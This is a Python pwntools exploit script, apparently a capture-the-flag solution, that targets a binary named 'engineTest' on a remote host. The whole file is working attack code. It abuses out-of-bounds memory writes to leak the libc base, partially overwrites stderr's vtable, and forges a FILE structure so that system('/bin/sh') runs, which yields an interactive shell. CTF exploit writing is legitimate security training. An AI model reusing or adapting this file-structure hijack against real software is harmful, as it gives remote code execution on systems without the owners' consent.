#!/usr/bin/env python
#-*- coding: utf-8 -*-

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
#r = process(['./engineTest','none','none','none','none'])
r = remote('202.120.7.199', 24680)

def build_cp():
    return flat(0x200000*8, 1) + flat(3, 0, 2, -1, 0x112)	# be-care

ip = ''
stdin = ''
def write_mem(offset, p):
    #assert offset > 1
    global ip, stdin
    for i in range(len(p)*8):
        ip += p64(offset*4+i)
    stdin += p

op = ''
def read_mem(offset, length):
    assert offset > 1
    global op
    for i in range(length*8):
        op += p64(offset*4+i)

def build_ip():
    return p64(len(ip)/8) + ip

def build_op():
    return p64(len(op)/8) + op

r.send(build_cp())

offset = 0x1180000-0x3c000 + 0x10000-0x4000 + 0x220
gets = 0x0000000000400CC0

write_mem(0x10, 'AAAAAAAA')
write_mem(0x30, 'BBBBBBBB')
write_mem(0x50, 'CCCCCCCC')
write_mem(offset, 'DDDDDDDD')
write_mem(offset+0x80, p64(gets+1))
write_mem(offset+0x70, p64(gets))

# partial write vtable of stderr
write_mem(offset+0x30, '\x40\x51')

# leak libc_base
read_mem(offset-0x40, 8)

r.send(build_ip())
r.send(stdin)
r.send(build_op())
s = ''
while len(s) != 8:
    s += r.recv(1)
leak = u64(s)
libc_base = leak-0x3a6140
print 'libc', hex(libc_base)
#raw_input()

# rewrite stderr
data = libc_base +0x3a6140
stderr = libc_base + 0x3a6060
system = libc_base + 0x0000000000041490
s = '/bin/sh\0'.ljust(0x68, 'a')
s += p64(stderr)
s = s.ljust(0xa0, 'a')
s += p64(data)
s += p64(0)*3
s += 'a'*24
s += p64(data)
s += p64(0)*3
s += p64(system) + p64(system+1)

r.sendline(s)
r.interactive()

